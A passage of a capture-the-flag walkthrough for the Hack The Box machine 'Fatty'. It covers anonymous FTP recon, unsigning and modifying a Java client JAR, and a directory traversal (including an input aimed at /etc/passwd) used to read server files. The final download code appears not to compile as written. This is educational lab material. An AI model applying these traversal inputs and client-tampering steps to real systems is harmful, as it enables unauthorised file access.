---
title: HTB: Fatty
url: https://0xdf.gitlab.io/2020/08/08/htb-fatty.html
date: 2020-08-08T14:45:00+00:00
difficulty: Insane [50]
os: Linux
tags: hackthebox, htb-fatty, ctf, java, nmap, ftp, update-alternatives, jar, wireshark, procyon, javac, directory-traversal, filter, reverse-engineering, tar, scp, cron, sqli, injection, deserialization, ysoserial, pspy, htb-arkham
---

![Fatty](https://0xdfimages.gitlab.io/img/fatty-cover.png)

Fatty forced me way out of my comfort zone. The majority of the box was reversing and modifying a Java thick client. First I had to modify the client to get the client to connect. Then I’ll take advantage of a directory traversal vulnerability to get a copy of the server binary, which I can reverse as well. In that binary, first I’ll find a SQL injection that allows me to log in as an admin user, which gives me access to additional functionality. One of the new functions uses serialized objects, which I can exploit using a deserialization attack to get a shell in the container running the server. Escalation to root attacks a recurring process that is using SCP to copy an archive of log files off the container to the host. By guessing that the log files are extracted from the archive, I’m able to create a malicious archive that allows me over the course of two SCPs to overwrite the root authorized\_keys file and then SSH into Fatty as root.

## Box Info

| Name | [Fatty](https://hackthebox.com/machines/fatty)  [Fatty](https://hackthebox.com/machines/fatty) [Play on HackTheBox](https://hackthebox.com/machines/fatty) |
| --- | --- |
| Release Date | [~~01 Feb 2020~~](https://twitter.com/hackthebox_eu/status/1222908349831925761) [08 Feb 2020](https://twitter.com/hackthebox_eu/status/1225766372573110273) |
| Retire Date | 08 Aug 2020 |
| OS | Linux Linux |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for Fatty |
| Radar Graph | Radar chart for Fatty |
| First Blood User | 03:07:32[sampriti sampriti](https://app.hackthebox.com/users/836) |
| First Blood Root | 15:26:36[jkr jkr](https://app.hackthebox.com/users/77141) |
| Creator | [qtc qtc](https://app.hackthebox.com/users/103578) |

## Recon

### nmap

`nmap` shows five open ports - FTP (TCP 21), SSH( TCP 22), and three SSL wrapped services on TCP 1337, 1338, and 1339:

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.174
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-18 14:57 EDT
Nmap scan report for 10.10.10.174
Host is up (0.014s latency).
Not shown: 65530 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
1337/tcp open  waste
1338/tcp open  wmc-log-svc
1339/tcp open  kjtsiteserver

Nmap done: 1 IP address (1 host up) scanned in 8.45 seconds
root@kali# nmap -p 21,22,1337,1338,1339 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.174
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-18 15:04 EDT
Nmap scan report for 10.10.10.174
Host is up (0.013s latency).

PORT     STATE SERVICE            VERSION
21/tcp   open  ftp                vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp      15426727 Oct 30 12:10 fatty-client.jar
| -rw-r--r--    1 ftp      ftp           526 Oct 30 12:10 note.txt
| -rw-r--r--    1 ftp      ftp           426 Oct 30 12:10 note2.txt
|_-rw-r--r--    1 ftp      ftp           194 Oct 30 12:10 note3.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.19
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh                OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 fd:c5:61:ba:bd:a3:e2:26:58:20:45:69:a7:58:35:08 (RSA)
|_  256 4a:a8:aa:c6:5f:10:f0:71:8a:59:c5:3e:5f:b9:32:f7 (ED25519)
1337/tcp open  ssl/waste?
|_ssl-date: 2020-03-18T19:07:18+00:00; +2m35s from scanner time.
1338/tcp open  ssl/wmc-log-svc?
|_ssl-date: 2020-03-18T19:07:18+00:00; +2m35s from scanner time.
1339/tcp open  ssl/kjtsiteserver?
|_ssl-date: 2020-03-18T19:07:18+00:00; +2m35s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2m34s, deviation: 0s, median: 2m34s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 202.43 seconds

```

The scripts point out that anonymous FTP login is allowed. Based on the [OpenSSH version](https://packages.debian.org/search?keywords=openssh-server), this looks like Debian 9 (Stretch).

### FTP - TCP 21

Given the anonymous login, I’ll log in and grab all the files:

```

root@kali# ftp 10.10.10.174
Connected to 10.10.10.174.
220 qtc's development server
Name (10.10.10.174:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp      15426727 Oct 30 12:10 fatty-client.jar
-rw-r--r--    1 ftp      ftp           526 Oct 30 12:10 note.txt
-rw-r--r--    1 ftp      ftp           426 Oct 30 12:10 note2.txt
-rw-r--r--    1 ftp      ftp           194 Oct 30 12:10 note3.txt
226 Directory send OK.
ftp> prompt
Interactive mode off.
ftp> mget *
local: fatty-client.jar remote: fatty-client.jar
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for fatty-client.jar (15426727 bytes).
226 Transfer complete.
15426727 bytes received in 2.85 secs (5.1677 MB/s)
local: note.txt remote: note.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note.txt (526 bytes).
226 Transfer complete.
526 bytes received in 0.00 secs (405.1040 kB/s)
local: note2.txt remote: note2.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note2.txt (426 bytes).
226 Transfer complete.
426 bytes received in 0.00 secs (468.4861 kB/s)
local: note3.txt remote: note3.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note3.txt (194 bytes).
226 Transfer complete.
194 bytes received in 0.00 secs (194.9106 kB/s)

```

There are three text notes, each from qtc to “members”. `note.txt`:

```

Dear members, 

because of some security issues we moved the port of our fatty java server from 
8000 to the hidden and undocumented port 1337. 
Furthermore, we created two new instances of the server on port 1338 and 1339. 
They offer exactly the same server and it would be nice if you use different 
servers from day to day to balance the server load. 

We were too lazy to fix the default port in the '.jar' file, but since you are all
senior java developers you should be capable of doing it yourself ;)

Best regards,
qtc

```

`note2.txt`:

```

Dear members, 

we are currently experimenting with new java layouts. The new client uses a static 
layout. If your are using a tiling window manager or only have a limited screen 
size, try to resize the client window until you see the login from.

Furthermore, for compatibility reasons we still rely on Java 8. Since our company 
workstations ship Java 11 per default, you may need to install it manually.

Best regards, 
qtc

```

`note3.txt`:

```

Dear members, 

We had to remove all other user accounts because of some seucrity issues.
Until we have fixed these issues, you can use my account:

User: qtc
Pass: clarabibi

Best regards,
qtc

```

The major take-aways:
- The three services running on 1337, 1338, and 1339 are the same.
- `fatty-client.jar` in its current state tries to connect to 8000. I’ll need to change it myself.
- The application is built for Java 8.
- Creds for the application - qtc / clarabibi

## Get fatty-client.jar Functioning

### Java Version

The current Java on my machine is version 11:

```

root@kali# java --version
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
openjdk 11.0.6 2020-01-14
OpenJDK Runtime Environment (build 11.0.6+10-post-Debian-2)
OpenJDK 64-Bit Server VM (build 11.0.6+10-post-Debian-2, mixed mode, sharing)

```

If I try to run the client with that, it does open, but then dumps a bunch of errors when I try to login. The note said I needed Java 8 to make it run.

It turns out I already have the OpenJDK Java 8 version on my Kali image (it may be there by default, I rebuilt my VM recently). If I didn’t, I could get the Oracle version [here](https://www.oracle.com/java/technologies/javase-jdk8-downloads.html). Now I’ll use `update-alternatives` (see [post](/2020/03/24/update-alternatives.html)) to set 8 to the primary version:

```

root@kali# update-alternatives --config java
There are 2 choices for the alternative java (providing /usr/bin/java).

  Selection    Path                                            Priority   Status
------------------------------------------------------------
* 0            /usr/lib/jvm/java-11-openjdk-amd64/bin/java      1111      auto mode
  1            /usr/lib/jvm/java-11-openjdk-amd64/bin/java      1111      manual mode
  2            /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java   1081      manual mode

Press <enter> to keep the current choice[*], or type selection number: 2
update-alternatives: using /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java to provide /usr/bin/java (java) in manual mode

root@kali# java -version
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
openjdk version "1.8.0_212"
OpenJDK Runtime Environment (build 1.8.0_212-8u212-b01-1-b01)
OpenJDK 64-Bit Server VM (build 25.212-b01, mixed mode)

```

### Triage of fatty-client.jar

Now when I run it with `java -jar fatty-client.jar`, I get a GUI login screen:

![GUI login](https://0xdfimages.gitlab.io/img/image-20200804202536731.png)

When I enter creds and hit Login, there’s an error:

![login error](https://0xdfimages.gitlab.io/img/image-20200804202647852.png)

I opened Wireshark and started capturing on tun0 and hit Login again. Same error, but no traffic. After a few tries, I moved to eth0, and saw the reason:

[![Wireshark](https://0xdfimages.gitlab.io/img/image-20200804202808371.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200804202808371.png)

It’s not trying to get to 10.10.10.181. It’s doing a DNS lookup for server.fatty.htb, and that’s going out my main interface, in this case to Cloudflairs 1.1.1.1 DNS server. I added the following to my `/etc/hosts` file:

```
10.10.10.181 fatty.htb server.fatty.htb

```

Now I switched Wireshark back to tun0, and hit Login again. Same connection error, this time, it’s reaching out to TCP port 8080, and getting a RST packet back:

[![Wireshark](https://0xdfimages.gitlab.io/img/image-20200804202852731.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200804202852731.png)

This is consistent with the note above that said it’s no longer running on 8080, but 1337, 1338, and 1339.

### Unpack / Repack Jar

Before taking on something like unpack, modify, repack, I’ll start with unpack then repack to make sure I can do that without errors. I’ll make a directory, `unzipped`, and then unzip the Jar into it:

```

root@kali# unzip -d unzipped/ fatty-client.jar
Archive:  fatty-client.jar
  inflating: unzipped/META-INF/MANIFEST.MF
  inflating: unzipped/META-INF/1.SF
  ...[snip]...

```

Now, from within that directory, I’ll run `jar -cmf META-INF/MANIFEST.MF ../new.jar *`:
- `-c` - Create new jar file.
- `-m` - include a preexisting manifest; I had issues with the manifest coming out blank without this flag.
- `-f`- specifies the jar file to be created.

Now I can run `java -jar new.jar` and it works:

![image-20200320162159460](https://0xdfimages.gitlab.io/img/image-20200320162159460.png)

### Modify Port

#### Modify beans.xml

In my directory of unzipped Jar, the top level directory contains some directories and a handful of files:

```

root@kali# ls
beans.xml  exit.png  fatty.p12  htb  log4j.properties  META-INF  module-info.class  org  spring-beans-3.0.xsd

```

I used `grep` to look for references to “server.fatty.htb” from the DNS queries I observed in Wireshark.

```

root@kali# grep -r 'server.fatty.htb' .
./beans.xml:      <constructor-arg index="0" value = "server.fatty.htb"/>

```

`beans.xml` has the connection info in the second section:

```

<?xml version = "1.0" encoding = "UTF-8"?>

<beans xmlns="http://www.springframework.org/schema/beans"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="
                http://www.springframework.org/schema/beans     
                spring-beans-3.0.xsd">

<!-- Here we have an constructor based injection, where Spring injects required arguments inside the
         constructor function. -->
   <bean id="connectionContext" class = "htb.fatty.shared.connection.ConnectionContext">
      <constructor-arg index="0" value = "server.fatty.htb"/>
      <constructor-arg index="1" value = "8000"/>
   </bean>
   
<!-- The next to beans use setter injection. For this kind of injection one needs to define an default
constructor for the object (no arguments) and one needs to define setter methods for the properties. -->
   <bean id="trustedFatty" class = "htb.fatty.shared.connection.TrustedFatty">
      <property name = "keystorePath" value = "fatty.p12"/>
   </bean>
   
   <bean id="secretHolder" class = "htb.fatty.shared.connection.SecretHolder">
      <property name = "secret" value = "clarabibiclarabibiclarabibi"/>
   </bean>
   
<!--  For out final bean we use now again constructor injection. Notice that we use now ref instead of val -->
   <bean id="connection" class = "htb.fatty.client.connection.Connection">
      <constructor-arg index = "0" ref = "connectionContext"/>
      <constructor-arg index = "1" ref = "trustedFatty"/>
      <constructor-arg index = "2" ref = "secretHolder"/>
   </bean>

</beans>

```

I’ll update the port, and save the file. I can then create a new Jar file from the directory:

```

root@kali# jar -cmf META-INF/MANIFEST.MF ../fatty-client-fixed_port.jar *
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true

```

When I run this new `.jar`, it opens, but when I hit Login, errors dump:

```

root@kali# java -jar fatty-client-fixed_port.jar
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Exception in thread "AWT-EventQueue-1" org.springframework.beans.factory.BeanDefinitionStoreException: Unexpected exception parsing XML document from class path resource [beans.xml]; nested excep
tion is java.lang.SecurityException: SHA-256 digest error for beans.xml
        at org.springframework.beans.factory.xml.XmlBeanDefinitionReader.doLoadBeanDefinitions(XmlBeanDefinitionReader.java:419)
...[snip]...

```

There’s a `SHA-256 digest error for beans.xml`. I modified the file, and now the checksum doesn’t match.

#### Update Digest - Fail

I tried to fix this by finding the entry for `beans.xml` in the `META-INF/MANIFEST.MF` file:

```

Manifest-Version: 1.0
Archiver-Version: Plexus Archiver
Built-By: root
Sealed: True
Created-By: Apache Maven 3.3.9
Build-Jdk: 1.8.0_232
Main-Class: htb.fatty.client.run.Starter

Name: META-INF/maven/org.slf4j/slf4j-log4j12/pom.properties
SHA-256-Digest: miPHJ+Y50c4aqIcmsko7Z/hdj03XNhHx3C/pZbEp4Cw=

Name: org/springframework/jmx/export/metadata/ManagedOperationParameter.class
SHA-256-Digest: h+JmFJqj0MnFbvd+LoFffOtcKcpbf/FD9h2AMOntcgw=

Name: org/springframework/format/support/FormattingConversionService.class
SHA-256-Digest: Q1Wy5C/kxkONF+15qSsaFrNLrIuOcu3qpON1u0O+FrY=

Name: org/springframework/context/ApplicationEventPublisher.class
SHA-256-Digest: VuQ0PXRkcCGEBknWpKWaKolUEf2J6gaG0CIJA2n0rhE=
...[snip]...
Name: beans.xml
SHA-256-Digest: Em4p96+fyLIzh/w0+4TGW0TCP6uKKliOZjBhA9hb53g=
...[snip]...

```

That’s an interesting format of SHA256. It looks like rather than hex encoded, it’s base64-encoded. I verified this by looking at the first file in the manifest. With a bit of bash-foo, I got it to match for a random file:

```

root@kali# sha256sum META-INF/maven/org.slf4j/slf4j-log4j12/pom.properties | cut -d' ' -f1 | xxd -r -p | base64
miPHJ+Y50c4aqIcmsko7Z/hdj03XNhHx3C/pZbEp4Cw=

```

Now I’ll calculate the new hash for `beans.xml`, and update it:

```

root@kali# sha256sum beans.xml | cut -d' ' -f1 | xxd -r -p | base64
f/D4a+DZ53lRwjwkcYauGCDdJ5AJT0bZ9wsIBzqDdJ8=

```

I recreated the Jar just like before, and it still fails. It turns out that not only is there a hash, but then a signature that comes from the author’s private certificate, which I don’t have.

#### Remove Signing

In reading about Jar signing, I came across [this post on StackOverflow](https://stackoverflow.com/questions/8176166/invalid-sha1-signature-file-digest), where someone talked about removing signing:

> This error can also happen when the jar is signed twice.
>
> The solution was to ‘unsign’ the jar by deleting \*.**SF**, \*.**DSA**, \*.**RSA** files from the jar’s **META-INF** and then signing the jar again.

This Jar has two of those:

```

root@kali# ls META-INF/*.SF META-INF/*.DSA META-INF/*.RSA 2>/dev/null
 META-INF/1.RSA   META-INF/1.SF

```

I’ll remove them, and repackage the Jar. Now on running the Jar, it opens again. And logging in works:

![image-20200318165813430](https://0xdfimages.gitlab.io/img/image-20200318165813430.png)

On clicking OK, there’s a empty window with commands in the menus at the top:

![image-20200318165907246](https://0xdfimages.gitlab.io/img/image-20200318165907246.png)

### Fatty Client Enumeration

Now that I can log into the client, I’ll explore what it has to offer. The menus break out as follows, with disabled menus shown with `x`, and results shown as well:

```
- File
  - Exit
- Profile
  - Whoami 
      Username: qtc
      Rolename: user
  x ChangePassword
- Server Status
  x Uname
  x Users
  x Netstat
  x Ipconfig
- FileBrowser
  - Configs
      .tmuxconfig
      sudoers.config
      .vimrc
      sshd_config
  - Notes
      security.txt
      shopping.txt
      schedule.txt
  - Mail
      report.txt
      dave.txt
      mom.txt
- ConnectionTest
  - Ping
      Pong
- Help
  - Contact
      This client was developed with <3 by qtc.
  - About
      Dear user,

      unfortunately we are currently very busy with writing new functionality for this awesome fatclient.This development takes so much time, that nobody of our staff was available for writing a useful help file so far.However, the client is written by our Java GUI experts who have tons of experience in creating user friendly GUIs.So theoretically, everything should be quite self explanatory. If you find bugs or have questions regarding specific features do not hesitate to contact us!

      If you have urgent problems with the client, you can always decompile it and look at the source code directly :)

```

The bar at the bottom allows me to open files. The various configs are vanilla. `security.txt` just points out that there are vulnerabilities in this application. `report.txt` is similar. `dave.txt` has some interesting potential clues:

```

Hey qtc, 

until the issues from the current pentest are fixed we have removed all administrative users from the database.
Your user account is the only one that is left. Since you have only user permissions, this should prevent exploitation
of the other issues. Furthermore, we implemented a timeout on the login procedure. Time heavy SQL injection attacks are
therefore no longer possible.

Best regards,
Dave

```

## Get fatty-server.jar

### Strategy

At this point I want to try to exploit the server to get it to do things it’s not supposed to do. I could look for vulnerabilities in the client, but because I control the client, I’m going to re-write it to do the things I want it to do. I could approach this by creating a new client from scratch, but given my Java skills (or lack of), I’m going to modify the existing client.

### Modify Jar - POC

I want to start with something simple to show that I can modify the client. I wrote an [entire post](/2020/08/08/jar-files-analysis-and-modifications.html#modifying-compiled-classes) on how to do these modifications (now updated with Fatty examples and pinned in the table of contents for this post), so see that for details. The summary of the steps is:
- Use `procyon` to decompile the class file into Java code;
- Change the `.java` file as needed;
- Try to compile with `javac`, and deal with compilation errors;
- Successfully compile with `javac`;
- Re-archive as a Jar file.

To start, I decided to just have the username and password filled in when the app opens. That means two modifications to the decompiled `htb/fatty/client/gui/ClientGuiTest.java`. Much of this file is just setting up the various elements of the GUI and adding them to the overall panel. I’ll find where the input fields are created that take username and password, and add the two strings to the constructors for `JTextField` and `JPasswordField` so that they start with those values by default:

```

        (this.tfUsername = new JTextField("qtc")).setBounds(294, 218, 396, 27);
        LoginPanel.add(this.tfUsername);
        this.tfUsername.setColumns(10);
        (this.tfPassword = new JPasswordField("clarabibi")).setColumns(10);

```

On running the new Jar, the changes worked. The username and password are filled in on opening:

![image-20200324144531466](https://0xdfimages.gitlab.io/img/image-20200324144531466.png)

### Account Type Modifications

Given that the functionality that is disabled based on my access as a user and not an admin, I found where in the code that is checked, and tried to change it. Unfortunately for me, changing it in the client didn’t get much further, as the server rejected the attempts.

#### Enable Menus

I tried a bunch of things that didn’t do much. All of the menu items are set to disabled until successful login, where this code sets some valid based on user role:

```

if (roleName.contentEquals("admin")) {
    uname.setEnabled(true);
    users.setEnabled(true);
    netstat.setEnabled(true);
    ipconfig.setEnabled(true);
    changePassword.setEnabled(true);
}
if (!roleName.contentEquals("anonymous")) {
    whoami.setEnabled(true);
    configs.setEnabled(true);
    notes.setEnabled(true);
    mail.setEnabled(true);
    ping.setEnabled(true);
}

```

I tried adding a `!` before the first one, so that my non-admin user would get those menus enabled yet. Unfortunately, that just returned messages like:

![image-20200324144742189](https://0xdfimages.gitlab.io/img/image-20200324144742189.png)

#### Modify Access Check

Each of the menu items are assigned to call a function from `htb/fatty/client/methods/Invoker`. For example, `uname`:

```

    public String uname() throws MessageParseException, MessageBuildException, IOException {
        final String methodName = new Object() {}.getClass().getEnclosingMethod().getName();
        Invoker.logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");
        if (AccessCheck.checkAccess(methodName, this.user)) {
            return "Error: Method '" + methodName + "' is not allowed for this user account";
        }
        this.action = new ActionMessage(this.sessionID, "uname");
        this.sendAndRecv();
        if (this.response.hasError()) {
            return "Error: Your action caused an error on the application server!";
        }
        return this.response.getContentAsString();
    }

```

This code calls `AccessCheck.checkAccess`, and if that call returns True, it returns an error message which is then displayed. I see that same error above when I tried to enable the menus. So even with the menu’s enabled, it’s still not reaching out to the server, but failing locally.

That function is in `htb/fatty/client/methods/AccessCheck`:

```

public class AccessCheck
{
    private static Map<String, Integer> functionMap;
    private static FattyLogger logger;

    public static boolean checkAccess(final String methodName, final User user) {
        final Integer methodID = AccessCheck.functionMap.get(methodName);
        if (methodID == null) {
            AccessCheck.logger.logError("[-] Acces denied. User '" + user.getUsername() + "'with role '" + user.getRoleName() + "' called an unkown method with name '" + methodName + "'.");
            return true;
        }
        if (!user.getRole().isAllowed(methodID)) {
            AccessCheck.logger.logError("[-] Acces denied. Method '" + methodName + "' was called by user '" + user.getUsername() + "'with role '" + user.getRoleName() + "'.");
            return true;
        }
        return false;
    }

    static {
        AccessCheck.functionMap = Stream.of(new Object[][] { { "ping", 1 }, { "whoami", 2 }, { "showFiles", 3 }, { "about", 4 }, { "contact", 5 }, { "open", 6 }, { "changePW", 7 }, { "uname", 8  }, { "users", 9 }, { "netstat", 10 }, { "ipconfig", 11 } }).collect(Collectors.toMap(data -> (String)data[0], data -> (Integer)data[1]));
        AccessCheck.logger = new FattyLogger();
    }
}

```

The real check here (after checking that the `methodID` is not `null`) is a call to `user.getRole().isAllowed(methodID)`. If that returns false, the function will fail (return `true`). Else, it returns `false` (success). I changed all three return values to `false`, and recompiled. I still got the same error message.

This confused me for a while. So I added 0xdf to the end of the error string. Still got the same unmodified error string. Only after more time than I’m proud to admit of thinking I was crazy did it occur to me that the server could be sending back the exact same message. I proved this by modifying the last line from `Invoker.java` above to:

```

return this.response.getContentAsString() + " from server";

```

The “from server” string was a part of the error message now. Bypassing the client side check here didn’t help as the server was doing the same check.

### Understanding Directories

#### Traversal Filter Enumeration

The client allows for opening of files. I need to pick one of the options from the FileBrowser menu. Then I can enter a filename in the field next to the Open button. I try to open `../../../../../../../etc/passwd`:

![image-20200325150026999](https://0xdfimages.gitlab.io/img/image-20200325150026999.png)

There’s clearly some input sanitization going on here. It does give me the current directory, `/opt/fatty/files/` plus the directory I selected from the menu (in the image above mail). I tried just entering `..` and the error message shows what file failed to open:

![image-20200805080046884](https://0xdfimages.gitlab.io/img/image-20200805080046884.png)

Adding a file that shouldn’t exist, `../0xdf`, filtering hit again:

![image-20200805080129343](https://0xdfimages.gitlab.io/img/image-20200805080129343.png)

After a few tests, I can see what’s happening:

| Input | Result |
| --- | --- |
| `..` | `/opt/fatty/files/mail/..` |
| `../0xdf` | `/opt/fatty/files/mail0xdf` |
| `../../0xdf` | `/opt/fatty/files/mail../0xdf` |
| `../../../0xdf` | `/opt/fatty/files/mail..0xdf` |
| `../../../../0xdf` | `/opt/fatty/files/mail..../0xdf` |

There must be some server side filtering of the path to remove `/../` recursively, which is why sometimes the last `/` remains and others it doesn’t. This will make it impossible to move more than one directory up, but will allow that.

#### Directory Management

The GUI maintains a current working directory to allow for opening of files. Looking in the GUI code, there are two places where a current directory is managed. For each of the different directories in the FileBrowser, there’s a `this.currentFolder` variable that is stored, and then a directory passed to the server. For example, the `ActionListener` for the Notes menu item:

```

notes.addActionListener(new ActionListener() {
    @Override
    public void actionPerformed(final ActionEvent e) {
        String response = "";
        ClientGuiTest.this.currentFolder = "notes";
        try {
            response = ClientGuiTest.this.invoker.showFiles("notes");
        }
        catch (MessageBuildException | MessageParseException ex2) {
            JOptionPane.showMessageDialog(controlPanel, "Failure during message building/parsing.", "Error", 0);
        }
        catch (IOException e3) {
            JOptionPane.showMessageDialog(controlPanel, "Unable to contact the server. If this problem remains, please close and reopen the client.", "Error", 0);
        }
        textPane.setText(response);
    }
});

```

It sets `ClientGuiTest.this.currentFolder` to `"notes"`.

When a file is to be opened, `this.currentFolder` and the filename are passed to the `invoker.open` function:

```

openFileButton.addActionListener(new ActionListener() {
    @Override
    public void actionPerformed(final ActionEvent e) {
        if (ClientGuiTest.this.currentFolder == null) {
            JOptionPane.showMessageDialog(controlPanel, "No folder selected! List a directory first!", "Error", 0);
            return;
        }
        String response = "";
        final String fileName = ClientGuiTest.this.fileTextField.getText();
        fileName.replaceAll("[^a-zA-Z0-9.]", "");
        try {
            response = ClientGuiTest.this.invoker.open(ClientGuiTest.this.currentFolder, fileName);
        }
        catch (MessageBuildException | MessageParseException ex2) {
            JOptionPane.showMessageDialog(controlPanel, "Failure during message building/parsing.", "Error", 0);
        }
        catch (IOException e3) {
            JOptionPane.showMessageDialog(controlPanel, "Unable to contact the server. If this problem remains, please close and reopen the client.", "Error", 0);
        }
        textPane.setText(response);
    }
});

```

`invoker.open` passes both the folder and file names to the server, then accepts and returns the response (which is printed to the GUI):

```

public String open(final String foldername, final String filename) throws MessageParseException, MessageBuildException, IOException {
    final String methodName = new Object() {}.getClass().getEnclosingMethod().getName();
    Invoker.logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");
    if (AccessCheck.checkAccess(methodName, this.user)) {
        return "Error: Method '" + methodName + "' is not allowed for this user account -6";
    }
    (this.action = new ActionMessage(this.sessionID, "open")).addArgument(foldername);
    this.action.addArgument(filename);
    this.sendAndRecv();
    if (this.response.hasError()) {
        return "Error: Your action caused an error on the application server!";
    }
    String response = "";
    try {
        response = this.response.getContentAsString();
    }
    catch (Exception e) {
        response = "Unable to convert byte[] to String. Did you read in a binary file?";
    }
    return response;
}

```

#### Directory Traversal / File Read POC

I tried just changing the directory for `notes` to `..`:

```

                ClientGuiTest.this.currentFolder = "..";
                try {
                    response = ClientGuiTest.this.invoker.showFiles("..");
                }

```

On rebuild, I’m able to list the `/opt/fatty` directory:

![image-20200325152121725](https://0xdfimages.gitlab.io/img/image-20200325152121725.png)

I can also open `start.sh`:

```

#!/bin/sh

# Unfortunately alpine docker containers seems to have problems with services.
# I tried both, ssh and cron to start via openrc, but non of them worked. Therefore, 
# both services are now started as part of the docker startup script.

# Start cron service
crond -b

# Start ssh server
/usr/sbin/sshd

# Start Java application server
su - qtc /bin/sh -c "java -jar /opt/fatty/fatty-server.jar"

```

Some good hints in there for later. For now, I want a copy of the server Jar. Unfortunately, I can’t read it yet. If I try, the client crashes with errors. I know since it is a binary file, it won’t convert to a string and that will return an error.

### Client Upgrades

#### Add Buttons to GUI

Now I’ll upgrade this client to get what I want out of it. First I added some buttons and another text field to the control panel (three added objects are commented with `// added!`):

```

(this.fileTextField = new JTextField()).setBounds(18, 607, 164, 25);
controlPanel.add(this.fileTextField);
this.fileTextField.setColumns(10);
final JButton openFileButton = new JButton("Open");
openFileButton.setBounds(194, 607, 114, 25);
controlPanel.add(openFileButton);
final JButton downloadFileButton = new JButton("Download");  // added!
downloadFileButton.setBounds(316, 607, 114, 25);
controlPanel.add(downloadFileButton);
(this.dirTextField = new JTextField()).setBounds(438, 607, 164, 25); // added!
controlPanel.add(this.dirTextField);
final JButton dirButton = new JButton("Set Dir"); // added!
dirButton.setBounds(610, 607, 114, 25);
controlPanel.add(dirButton);
final JButton btnClear = new JButton("Clear");
btnClear.setBounds(731, 607, 114, 25);
controlPanel.add(btnClear);

```

I also had to add a declaration `private JTextField dirTextField;` at the variable declarations at the top (based on compiler errors). Now I can run this, and get the new buttons / fields:

![image-20200326073439172](https://0xdfimages.gitlab.io/img/image-20200326073439172.png)

#### Set Dir Button

Now I’ll add actions for the two additional buttons. First, `Set Dir`. I copied the action for the mail listener, and just changed the hard-coded “mail” strings to be the contents of the text field:

```

dirButton.addActionListener(new ActionListener() {
    @Override
    public void actionPerformed(final ActionEvent e) {
        String response = "";
        ClientGuiTest.this.currentFolder = ClientGuiTest.this.dirTextField.getText();
        try {
            response = ClientGuiTest.this.invoker.showFiles(ClientGuiTest.this.currentFolder);
        }
        catch (MessageBuildException | MessageParseException ex2) {
            JOptionPane.showMessageDialog(controlPanel, "Failure during message building/parsing.", "Error", 0);
        }
        catch (IOException e3) {
            JOptionPane.showMessageDialog(controlPanel, "Unable to contact the server. If this problem remains, please close and reopen the client.", "Error", 0);
        }
        textPane.setText(response);
    }
});

```

Now I can enter `..` and hit the button, and it displays the contents of `/opt/fatty`:

![image-20200326073730714](https://0xdfimages.gitlab.io/img/image-20200326073730714.png)

I can also open the text files with the open button (for example, in `../logs`, `info-log.txt`):

![image-20200326073832211](https://0xdfimages.gitlab.io/img/image-20200326073832211.png)

#### Download

I still need a way to download a binary file. The code isn’t set to handle binary files, as I can see in the `open` function in `htb/fatty/client/methods/Invoker`:

```

try {
    response = this.response.getContentAsString();
}
catch (Exception e) {
    response = "Unable to convert byte[] to String. Did you read in a binary file?";
}

```

When I tried to download the server Jar, things just hung and crashed, not even getting to these errors.

Because Java is strictly typed, I can’t just change that slightly. There are a few quick hacks I could throw together to get the result, but I’m practicing Java here, so I’ll make it nice.

I’ll copy the `openFileButton` code to make code for the `downloadFileButton`, and make a few changes to it (there’s a comment in the middle showing where edits start) so that response is also written to a file in the current directory:

```

downloadFileButton.addActionListener(new ActionListener() {  // change to downloadFileButton
    @Override
    public void actionPerformed(final ActionEvent e) {
        if (ClientGuiTest.this.currentFolder == null) {
            JOptionPane.showMessageDialog(controlPanel, "No folder selected! List a directory first!", "Error", 0);
            return;
        }
        String response = "";
        final String fileName = ClientGuiTest.this.fileTextField.getText();
        fileName.replaceAll("[^a-zA-Z0-9.]", "");
        try {
            // Edits in here. New open function, write to file
            response = ClientGuiTest.this.invoker.openbin(ClientGuiTest.this.currentFolder, fileName);
            OutputStream out = new FileOutputStream("./" + filename);
            OutputStream.write(response);
            OutputStream.close();
        }
        catch (MessageBuildException | MessageParseException ex2) {
            JOptionPane.showMessageDialog(controlPanel, "Failure during message building/parsing.", "Error", 0);
        }
        catch (IOException e3) {
            JOptionPane.showMessageDialog(controlPanel, "Unable to contact the server. If this problem remains,     please close and reopen the client.", "Error", 0);
        }
        textPane.setText("Wrote local file " + fileName + ".");
    }
});

```

